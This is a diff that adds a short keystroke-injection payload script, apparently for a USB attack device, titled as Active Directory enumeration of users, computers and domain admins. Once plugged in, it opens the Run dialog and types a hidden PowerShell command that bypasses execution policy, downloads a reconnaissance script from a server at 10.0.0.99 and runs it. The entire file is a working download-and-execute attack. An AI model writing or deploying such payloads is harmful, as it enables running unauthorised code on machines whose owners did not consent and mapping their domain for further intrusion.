@@ -1,0 +1,7 @@
+REM Title: Active Directory enumeration — users, computers, domain admins (no modules required)
+ATTACKMODE HID STORAGE
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell -w h -nop -ep bypass -c "iwr -Uri http://10.0.0.99:8000/serve/ad_recon.ps1 -UseBasicParsing | iex"
+ENTER
